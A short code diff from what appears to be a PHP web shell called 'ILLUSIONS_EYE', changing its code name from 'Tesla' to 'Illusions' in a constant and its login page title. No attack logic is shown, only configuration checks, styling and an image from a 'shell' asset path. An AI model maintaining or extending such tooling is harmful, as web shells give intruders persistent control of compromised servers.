@@ -172,7 +172,7 @@ if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_
 if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
 define("__ILLUSIONS_EYE_VERSION__", "4.1");
 define("__ILLUSIONS_EYE_UPDATE__", "2");
-define("__ILLUSIONS_EYE_CODE_NAME__", "Tesla");
+define("__ILLUSIONS_EYE_CODE_NAME__", "Illusions");
 define("___FOLDER__", "");
 define("__ILLUSIONS_EYE_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
 define("__ILLUSIONS_EYE_SECRET_KEY__", __ILLUSIONS_EYE_POST_ENCRYPTION__?_ILLUSIONS_EYESecretKey():'');
@@ -526,7 +526,7 @@ body{background: deeppink;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
-<title>.: ILLUSIONS_EYE Tesla :.</title><center>
+<title>.: ILLUSIONS_EYE Illusions :.</title><center>
 <center><img style="border-radius:100px;" width="800" height="800" alt="ILLUSIONS_EYE TEAM 2012" draggable="false" src="https://cdn-spygroup.xyz/assets/shell/godseye.webp" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
